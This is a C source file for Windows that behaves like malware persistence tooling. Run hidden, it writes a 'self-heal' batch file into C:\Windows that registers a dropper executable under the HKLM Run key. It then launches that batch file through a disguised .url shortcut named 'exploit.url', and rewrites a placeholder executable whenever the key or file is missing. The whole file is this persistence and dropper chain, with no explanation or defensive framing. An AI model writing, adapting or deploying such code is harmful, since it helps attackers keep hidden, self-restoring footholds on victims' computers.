#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

const char *dropperPath = "C:\\Program Files\\LotusorgDropper.exe";
const char *batPath     = "C:\\Windows\\LotusSelfHeal.bat";
const char *urlPath     = "C:\\Windows\\exploit.url";
const char *runKeyPath  = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const char *runKeyName  = "LOTUSorg";

void WriteDropperPlaceholder() {
    CreateDirectoryA("C:\\Program Files\\LOTUSorg", NULL);
    FILE *f = fopen(dropperPath, "wb");
    if (f) {
        char stub[64] = { 'M', 'Z', 0x90 }; 
        fwrite(stub, sizeof(stub), 1, f);
        fclose(f);
    }
}

void WriteBAT() {
    FILE *f = fopen(batPath, "w");
    if (f) {
        fprintf(f,
            "@echo off\n"
            "ping -n 2 8.8.8.8 >nul\n"
            "reg add \"HKLM\\%s\" /v %s /t REG_SZ /d \"%s\" /f\n"
            "if not exist \"%s\" (\n"
            "    echo MZ > \"%s\"\n"
            ")\n",
            runKeyPath, runKeyName, dropperPath,
            dropperPath, dropperPath
        );
        fclose(f);
    }
}

void WriteURL() {
    FILE *f = fopen(urlPath, "w");
    if (f) {
        fprintf(f,
            "[InternetShortcut]\n"
            "URL=cmd.exe /c start %%windir%%\\LotusSelfHeal.bat\n"
            "IconFile=cmd.exe\n"
        );
        fclose(f);
    }
}

int main() {
    WriteBAT();
    WriteURL();
    ShellExecuteA(NULL, "open", urlPath, NULL, NULL, SW_HIDE);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, runKeyPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS ||
        !PathFileExistsA(dropperPath)) {
        WriteDropperPlaceholder();
        WriteBAT();
        ShellExecuteA(NULL, "open", urlPath, NULL, NULL, SW_HIDE);
    }

    return 0;
}
